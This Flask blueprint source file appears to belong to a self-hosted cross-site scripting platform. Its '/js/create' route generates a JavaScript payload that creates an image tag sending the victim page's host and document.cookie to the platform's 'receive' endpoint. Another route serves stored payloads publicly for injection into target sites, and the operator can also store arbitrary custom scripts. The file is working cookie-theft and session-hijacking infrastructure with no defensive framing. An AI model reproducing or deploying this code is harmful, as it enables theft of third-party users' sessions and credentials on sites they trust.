from flask import Blueprint, render_template,request,session,redirect,url_for
from data import config
import pymysql
from tools import func
from datetime import datetime,timedelta

# 创建 home 蓝图
js_bp = Blueprint('js', __name__)

# 获取 title 配置
title = config.init.title

# 定义 home 路由
@js_bp.route('/js/id/<int:id>',methods=['GET'])
def js_xss(id):
    connection = pymysql.connect(**config.init.DB_CONFIG)
    try:
        with connection.cursor() as cursor:
            sql = "SELECT * FROM g_js WHERE id = %s"
            cursor.execute(sql, (id,))
            result = cursor.fetchone()
            if not result:
                return "No data", 404
            data = result[3]
            return str(data)

    finally:
        connection.close()

@js_bp.route('/js/cat/<int:id>',methods=['GET'])
def js_cat(id):
    if 'user' not in session or 'pwd' not in session:
        return redirect(url_for('login'))
    username = session.get('user')
    connection = pymysql.connect(**config.init.DB_CONFIG)
    cursor = connection.cursor(pymysql.cursors.DictCursor)
    try:
        gxss_sql = "SELECT * FROM g_js where username = %s"
        cursor.execute(gxss_sql, (username,))
        data_js = cursor.fetchall()

        cat_sql = "SELECT * FROM g_js where id = %s and username = %s"
        cursor.execute(cat_sql, (id, username,))
        data_name = cursor.fetchone()
        if data_name:
            name = data_name['name']
            js_code = data_name['js_code']
        else:
            name = ""
            js_code = ""
    except Exception as e:
        connection.rollback()
        raise e
    finally:
        connection.close()

    return render_template('code.html', title=title, username=username, data_js=data_js, name=name, id=id,
                           js_code=js_code)


@js_bp.route('/js/create',methods=['POST'])
def js_create():
    if 'user' not in session or 'pwd' not in session:
        return redirect(url_for('login'))

    if request.method == 'POST':
        len = request.form.get('len')
        description = request.form.get('description')
        name = request.form.get('js_name')
        jm_name = func.encrypt_to_hex(name)

        host = request.url_root
        if len == "0":
            js_template = 'var img=document.createElement("img");\n' \
                          'img.src="{http_host}receive?h="+escape(document.location.host)+"&m="+escape(document.cookie)+"&u={user}"+"&n={jm_name}";\n' \
                          'document.body.appendChild(img);'

            username = session.get('user')

            js_content = js_template.format(http_host=host, user=username, jm_name=jm_name)

            now = datetime.now()
            time_data = now.strftime("%Y-%m-%d %H:%M:%S")
            connection = pymysql.connect(**config.init.DB_CONFIG)
            try:
                with connection.cursor() as cursor:
                    insert_xss_sql = "INSERT INTO g_js (name, username, js_code, time_data, jm_name) VALUES (%s, %s, %s, %s, %s)"
                    cursor.execute(insert_xss_sql, (name, username, js_content, time_data, jm_name))
                    connection.commit()
            except Exception as e:
                connection.rollback()
                raise e
            finally:
                connection.close()
        if len == "1":
            js_content = description
            username = session.get('user')

            now = datetime.now()
            time_data = now.strftime("%Y-%m-%d %H:%M:%S")
            connection = pymysql.connect(**config.init.DB_CONFIG)

            try:
                with connection.cursor() as cursor:
                    insert_xss_sql = "INSERT INTO g_js (name, username, js_code, time_data, jm_name) VALUES (%s, %s, %s, %s, %s)"
                    cursor.execute(insert_xss_sql, (name, username, js_content, time_data, jm_name))
                    connection.commit()
            except Exception as e:
                connection.rollback()
                raise e
            finally:
                connection.close()

    return redirect(url_for('project.project'))

